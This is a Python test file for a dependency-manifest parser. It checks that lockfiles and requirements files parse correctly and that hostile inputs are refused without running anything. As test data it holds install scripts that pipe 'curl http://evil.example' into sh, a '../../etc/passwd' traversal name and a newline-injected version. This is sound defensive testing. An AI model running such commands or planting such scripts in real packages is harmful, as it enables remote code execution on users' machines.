"""Manifest parsing: valid files, hostile files, and the guarantee that nothing is executed or written."""

from __future__ import annotations

import json
import os
import subprocess
import time
from pathlib import Path
from typing import Any

import pytest

from app.appscan import manifests as m
from app.tests.canary import assert_no_canary, make_canary


def lock_v3(packages: dict[str, Any]) -> bytes:
    return json.dumps(
        {"name": "demo", "lockfileVersion": 3, "packages": {"": {"name": "demo"}, **packages}}
    ).encode()


def names(result: m.ParseResult) -> set[tuple[str, str]]:
    return {(p.name, p.version) for p in result.packages}


# --- package-lock.json ---------------------------------------------------------------------------------


def test_lockfile_v3_lists_registry_packages_and_marks_dev() -> None:
    data = lock_v3(
        {
            "node_modules/lodash": {
                "version": "4.17.20",
                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
            },
            "node_modules/@scope/pkg": {"version": "1.2.3-beta.1", "dev": True},
            "node_modules/a/node_modules/b": {"version": "0.0.1"},
        }
    )
    result = m.parse_manifest("package-lock.json", data)
    assert names(result) == {("lodash", "4.17.20"), ("@scope/pkg", "1.2.3-beta.1"), ("b", "0.0.1")}
    assert {p.name: p.dev for p in result.packages}["@scope/pkg"] is True
    assert result.size == len(data) and len(result.sha256) == 64 and result.unsupported == []


def test_lockfile_v1_nested_dependencies_are_read() -> None:
    data = json.dumps(
        {
            "lockfileVersion": 1,
            "dependencies": {"express": {"version": "4.16.0", "dependencies": {"qs": {"version": "6.5.1"}}}},
        }
    ).encode()
    assert names(m.parse_manifest("package-lock.json", data)) == {("express", "4.16.0"), ("qs", "6.5.1")}


def test_lockfile_entries_that_are_not_registry_packages_are_reported_not_guessed() -> None:
    data = lock_v3(
        {
            "node_modules/local": {"resolved": "../local", "link": True},
            "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@example.com/x.git"},
            "node_modules/bad name": {"version": "1.0.0"},
            "node_modules/ranged": {"version": "^1.0.0"},
            "node_modules/ok": {"version": "2.0.0"},
        }
    )
    result = m.parse_manifest("package-lock.json", data)
    assert names(result) == {("ok", "2.0.0")}
    assert len(result.unsupported) == 4


def test_duplicate_package_versions_are_listed_once() -> None:
    data = lock_v3(
        {"node_modules/x": {"version": "1.0.0"}, "node_modules/y/node_modules/x": {"version": "1.0.0"}}
    )
    assert len(m.parse_manifest("package-lock.json", data).packages) == 1


# --- package.json --------------------------------------------------------------------------------------


def test_package_json_checks_exact_versions_only() -> None:
    data = json.dumps(
        {
            "scripts": {"postinstall": "curl http://evil.example | sh"},
            "dependencies": {"left-pad": "1.3.0", "express": "^4.0.0", "tool": "github:user/repo"},
            "devDependencies": {"jest": "29.7.0"},
        }
    ).encode()
    result = m.parse_manifest("package.json", data)
    assert names(result) == {("left-pad", "1.3.0"), ("jest", "29.7.0")}
    assert {u.name for u in result.unsupported} == {"express", "tool"}
    assert all("curl" not in str(u) and "evil" not in str(u) for u in result.unsupported)


def test_package_json_without_dependencies_is_an_error_not_a_clean_result() -> None:
    with pytest.raises(m.ManifestError) as caught:
        m.parse_manifest("package.json", b'{"name": "x", "version": "1.0.0"}')
    assert caught.value.code == "malformed"


# --- requirements.txt ----------------------------------------------------------------------------------


def test_requirements_pinned_lines_are_read_and_names_normalised() -> None:
    text = (
        "# comment\n"
        "Django==3.2.0  # inline comment\n"
        "Flask_SQLAlchemy[async]==2.5.1 ; python_version >= '3.8'\n"
        "requests==2.19.0 \\\n    --hash=sha256:" + "a" * 64 + "\n"
        "PyYAML==5.3\n"
    )
    result = m.parse_manifest("requirements.txt", text.encode())
    assert names(result) == {
        ("django", "3.2.0"),
        ("flask-sqlalchemy", "2.5.1"),
        ("requests", "2.19.0"),
        ("pyyaml", "5.3"),
    }
    assert all(p.ecosystem == "PyPI" for p in result.packages)


def test_requirements_unpinned_urls_options_and_paths_are_reported_without_copying_text() -> None:
    secret = make_canary()
    text = (
        f"private @ https://user:{secret}@host.example/pkg.whl\n"
        f"git+https://x:{secret}@github.example/org/repo.git#egg=repo\n"
        "-r other.txt\n"
        "--index-url https://pypi.example/simple\n"
        "./local/pkg\n"
        "flask>=2.0\n"
        "numpy\n"
        "ok==1.0\n"
    )
    result = m.parse_manifest("requirements.txt", text.encode())
    assert names(result) == {("ok", "1.0")}
    assert len(result.unsupported) == 7
    assert_no_canary(secret, repr(result))


def test_requirements_with_only_options_is_an_error() -> None:
    with pytest.raises(m.ManifestError):
        m.parse_manifest("requirements.txt", b"-r base.txt\n# nothing else\n")


# --- hostile and invalid input -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name", ["setup.py", "../package.json", "dir/package.json", "Package.json", "", "yarn.lock", "pom.xml"]
)
def test_only_the_named_manifest_files_are_accepted(name: str) -> None:
    with pytest.raises(m.ManifestError) as caught:
        m.parse_manifest(name, b"{}")
    assert caught.value.code == "unsupported_format"


@pytest.mark.parametrize(
    ("data", "code"),
    [
        (b"", "empty"),
        (b"   \n", "empty"),
        (b"PK\x03\x04" + b"0" * 50, "not_text"),
        (b"\x1f\x8b\x08" + b"0" * 50, "not_text"),
        (b"\x7fELF" + b"0" * 50, "not_text"),
        (b'{"dependencies": {}}\x00', "not_text"),
        (b"\xff\xfe\xfa invalid utf8", "not_text"),
        (b"{not json", "malformed"),
        (b"[1, 2, 3]", "malformed"),
        (b'"a string"', "malformed"),
        (b"{}", "malformed"),
        (b"x" * (m.MAX_FILE_BYTES + 1), "too_large"),
    ],
)
def test_invalid_files_end_in_a_clean_error_with_fixed_text(data: bytes, code: str) -> None:
    name = "package-lock.json"
    with pytest.raises(m.ManifestError) as caught:
        m.parse_manifest(name, data)
    assert caught.value.code == code
    assert "{not json" not in str(caught.value)


def test_deeply_nested_json_is_refused_before_parsing() -> None:
    data = ("[" * 5000 + "]" * 5000).encode()
    with pytest.raises(m.ManifestError) as caught:
        m.parse_manifest("package-lock.json", b'{"packages": ' + data + b"}")
    assert caught.value.code == "too_deep"
    with pytest.raises(m.ManifestError):
        m.parse_manifest("package-lock.json", b'{"a": ' + b'{"a":' * 70 + b"1" + b"}" * 70 + b"}")


def test_brackets_inside_strings_do_not_count_as_nesting() -> None:
    data = lock_v3({"node_modules/ok": {"version": "1.0.0", "description": "[" * 500 + '\\"' + "{" * 500}})
    assert names(m.parse_manifest("package-lock.json", data)) == {("ok", "1.0.0")}


def test_too_many_packages_is_refused() -> None:
    packages = {f"node_modules/p{i}": {"version": "1.0.0"} for i in range(m.MAX_PACKAGES + 1)}
    with pytest.raises(m.ManifestError) as caught:
        m.parse_manifest("package-lock.json", lock_v3(packages))
    assert caught.value.code == "too_many_packages"


def test_unsupported_list_is_capped_and_flagged() -> None:
    packages = {f"node_modules/p{i}": {"version": "^1.0.0"} for i in range(m.MAX_UNSUPPORTED + 50)}
    result = m.parse_manifest("package-lock.json", lock_v3(packages))
    assert len(result.unsupported) == m.MAX_UNSUPPORTED and result.unsupported_truncated


def test_a_maximum_size_file_parses_quickly() -> None:
    packages = {f"node_modules/p{i}": {"version": "1.0.0", "integrity": "x" * 40} for i in range(15_000)}
    data = lock_v3(packages)
    assert len(data) < m.MAX_FILE_BYTES
    start = time.perf_counter()
    result = m.parse_manifest("package-lock.json", data)
    assert len(result.packages) == 15_000 and time.perf_counter() - start < 5.0


def test_pathological_requirements_lines_are_fast() -> None:
    for line in (
        "a" * 100_000,
        "a==" + "1" * 100_000,
        " " * 100_000 + "x",
        "a[" + "," * 100_000,
        "\\\n" * 50_000,
    ):
        start = time.perf_counter()
        try:
            m.parse_manifest("requirements.txt", (line + "\nok==1.0\n").encode())
        except m.ManifestError:
            pass
        assert time.perf_counter() - start < 2.0


def test_hostile_names_are_not_accepted() -> None:
    data = lock_v3(
        {
            "node_modules/ok": {"version": "1.0.0"},
            "node_modules/../../etc/passwd": {"version": "1.0.0"},
            "node_modules/" + "a" * 300: {"version": "1.0.0"},
            "node_modules/UPPER": {"version": "1.0.0"},
            "node_modules/x": {"version": "1.0.0\nINJECT"},
        }
    )
    assert names(m.parse_manifest("package-lock.json", data)) == {("ok", "1.0.0")}


# --- nothing runs and nothing is written ---------------------------------------------------------------


def test_parsing_never_starts_a_process_touches_the_network_or_writes_files(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def forbidden(*args: object, **kwargs: object) -> None:
        raise AssertionError("parsing must not execute anything or open the network")

    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    monkeypatch.setattr("socket.socket.connect", forbidden)
    monkeypatch.chdir(tmp_path)
    package_json = json.dumps(
        {
            "scripts": {"preinstall": "touch pwned", "postinstall": "curl http://127.0.0.1/x"},
            "dependencies": {"a": "1.0.0"},
        }
    ).encode()
    m.parse_manifest("package.json", package_json)
    m.parse_manifest(
        "package-lock.json", lock_v3({"node_modules/a": {"version": "1.0.0", "hasInstallScript": True}})
    )
    m.parse_manifest("requirements.txt", b"a==1.0\n-e .\n")
    assert list(tmp_path.iterdir()) == []


def test_results_hold_no_file_content_beyond_package_coordinates() -> None:
    secret = make_canary()
    data = json.dumps(
        {"description": secret, "scripts": {"x": secret}, "dependencies": {"a": "1.0.0", "b": secret}}
    ).encode()
    result = m.parse_manifest("package.json", data)
    assert_no_canary(secret, repr(result))
